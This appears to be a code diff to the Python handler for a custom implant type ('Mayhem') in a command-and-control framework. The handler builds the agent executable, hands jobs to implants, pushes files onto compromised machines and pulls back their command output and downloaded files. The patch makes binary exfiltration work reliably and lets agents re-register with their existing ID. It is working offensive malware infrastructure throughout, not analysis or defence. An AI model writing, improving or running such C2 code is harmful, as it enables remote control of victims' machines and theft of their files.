@@ -1,5 +1,6 @@
 import os
-from base64 import b64decode
+from base64 import b64decode, b64encode
+from struct import pack
 
 from dotenv import load_dotenv
 
@@ -59,7 +60,8 @@ class MayhemUpload(Command):
         packer.add_int(self.CommandId)
         packer.add_data(arguments["remote_path"])
         file_content = open(arguments["local_file"], "rb").read()
-        packer.add_data(file_content)
+        packer.buffer += pack("<L", len(file_content)) + file_content
+        packer.length += 4 + len(file_content)
         return packer.get_buffer()
 
 class MayhemDownload(Command):
@@ -239,6 +241,27 @@ class Mayhem(AgentType):
 
         self.builder_send_payload( config[ 'ClientID' ], self.Name + ".exe", data)
 
+    def download_bytes(self, agent_id: str, file_name: str, content: bytes) -> None:
+        self._Service_instance.Socket.send(
+            json.dumps(
+                {
+                    "Head": {
+                        "Type": "Agent"
+                    },
+                    "Body": {
+                        "Type"    : "AgentOutput",
+                        "AgentID" : agent_id,
+                        "Callback" : {
+                            "MiscType" : "download",
+                            "FileName" : file_name,
+                            "Size"     : len(content),
+                            "Content"  : b64encode(content).decode("utf-8")
+                        }
+                    }
+                }
+            )
+        )
+
     def response (self, response: dict) -> bytes:
         agent_header = response["AgentHeader"]
         agent_response = b64decode( response["Response"] )
@@ -307,6 +330,13 @@ class Mayhem(AgentType):
 
             AgentID = response["Agent"]["NameID"] # This is the str version of the existing agent ID but it comes under the name of NameID
 
+            if Command == REGISTER_AGENT:
+                print("Agent re-registering")
+                try:
+                    return int(AgentID).to_bytes(4, "little")
+                except (TypeError, ValueError):
+                    return b''
+
             if Command == GET_JOB:
                 print("Get the list of jobs assigned to this agent.")
 
@@ -318,16 +348,16 @@ class Mayhem(AgentType):
                 print(f"Tasks: {Tasks.hex()}")
                 return Tasks
             elif Command == OUTPUT_AGENT:
-                Output = response_parser.parse_str()
+                Output = response_parser.parse_bytes().decode("utf-8", "replace")
                 print("Output: \n" + Output)
                 self.console_message(AgentID, "Done", "Recieved Output:", Output)
 
             elif Command == COMMAND_DOWNLOAD:
                 FileName = response_parser.parse_str()
-                FileContent = response_parser.parse_str()
+                FileContent = response_parser.parse_bytes()
                 print(f"Download: {FileName} ({len(FileContent)} bytes)")
                 self.console_message(AgentID, "Done", f"Downloaded {FileName}", f"{len(FileContent)} bytes")
-                self.download_file(AgentID, FileName, len(FileContent), FileContent)
+                self.download_bytes(AgentID, FileName, FileContent)
             else:
                 self.console_message(AgentID, "Error", "Command not found: %4x" % Command, "")
         return b''
